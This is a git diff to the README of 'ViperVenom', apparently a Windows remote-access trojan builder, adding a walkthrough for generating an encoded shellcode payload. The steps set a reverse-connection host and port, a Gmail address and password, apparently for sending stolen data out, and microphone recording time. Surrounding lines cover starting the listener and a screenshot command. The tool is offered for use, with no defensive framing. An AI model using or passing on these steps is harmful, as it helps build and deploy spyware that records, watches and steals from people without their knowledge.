@@ -59,7 +59,6 @@ Thanks for PyArmor developers for the ability to encode Python code without brea
 * sounddevice
 * scipy
 
-# Starting Listener (Updated 21/08/2021)
 
 After starting the software, to see which options are available, type "list" or "show list", the list of available options will be printed out
 ```
@@ -85,7 +84,7 @@ Available Payloads Any Windows:
 1 | windows/vipervenom/tcp/payload | Best Option for Windows Exploitation.
 
 ```
-You should brought to the listener page.
+You should be brought to the listener page.
 
 To select a payload
 ```
@@ -98,12 +97,12 @@ After selecting payload, you must set up your host IP and port that you want to 
 ```
 EXAMPLE:
 
-Listener) Windows/ViperVenom/TCP/Payload > set host 192.168.1.107
-(Listener) Windows/ViperVenom/TCP/Payload > set port 443
+Listener) Windows/ViperVenom/TCP/Payload > set host YOURIP
+(Listener) Windows/ViperVenom/TCP/Payload > set port YOURPORT
 (Listener) Windows/ViperVenom/TCP/Payload > show host
-LHOST=192.168.1.107
+LHOST=YOURIP
 (Listener) Windows/ViperVenom/TCP/Payload > show port
-LPORT=443
+LPORT=YOURPORT
 (Listener) Windows/ViperVenom/TCP/Payload > 
 ```
 After you set everything up, type run and enter to start the listener
@@ -112,8 +111,79 @@ After you set everything up, type run and enter to start the listener
 (Listener) Windows/ViperVenom/TCP/Payload > run
 [*] Starting Listener...
 Listener Started, Waiting for Connections...
-``
+```
+
+# Generating Payload (Updated 21/08/2021)
+In this section, you will be able to generate your own ViperVenom Python payload, convert it to an encoded shellcode payload, or an executable.
+
+First, run the tool
+```
+python3 vipervenom.py
+```
+You should be brought to the starting page, to show the list, type "show list" or "list", to see the available options.
+```
+Landing/ViperVenom/ > show list
+
+1 | Start Handler Listener                             
+
+2 | Generate ViperVenom Payload
+```
+To generate a payload, we would have to use the second option,
+```
+Landing/ViperVenom/ > use 2
+/ViperVenom/ > 
+
+```
+To see the available payloads to generate, "show payloads" will be a helpful command.
+```
+/ViperVenom/ > show payloads
+
+Available Payloads Any Windows:                                                                                                                                                                       
+                                                                                                                                                                                                                  
+1 | generator/vipervenom/tcp/payload | Best Option for Windows Exploitation.
+```
+To use this generator, type "use" with its name, just like this
+```
+/ViperVenom/ > use generator/vipervenom/tcp/payload
+(Generator) Windows/ViperVenom/TCP/Payload > 
+```
+Now, you have to set everything yourself, host IP address, port to listen to, Gmail address, Gmail password (don't worry, we do not log anything you do in this software. At all),
+microphone record seconds, and filename, here's a quick walkthrough
+```
+(Generator) Windows/ViperVenom/TCP/Payload > set host YOURIP
+(Generator) Windows/ViperVenom/TCP/Payload > set port YOURPORT
+(Generator) Windows/ViperVenom/TCP/Payload > set gmailaddr YOURGMAILADDR@gmail.com
+(Generator) Windows/ViperVenom/TCP/Payload > set gmailpass YOURPASSWORD
+(Generator) Windows/ViperVenom/TCP/Payload > set micrecord SECONDS
+(Generator) Windows/ViperVenom/TCP/Payload > set filename YOURFILENAME.py
+
+```
+Once you are done setting it up, you can recheck everything by doing "show OPTIONNAME", just like here
+```
+EXAMPLE:
+
+(Generator) Windows/ViperVenom/TCP/Payload > show gmailaddr
+GAMILADDR=revise7testing@gmail.com
+```
+To generate the payload
+```
+(Generator) Windows/ViperVenom/TCP/Payload > generate
+[*] Generating Payload
+.
+..
+...
+[*] Converting Code to a Shellcode, Please Wait
+.
+..
+...
+
+[*] Payload Generated, Payload is Ready.
+[*] Would You Like to Start Listener? 
+```
+And you finished, your payload is ready, you can convert it to an executable or do whatever you want with it.
+
 ## Special Commands
+
 ```
 screenshot
 ```
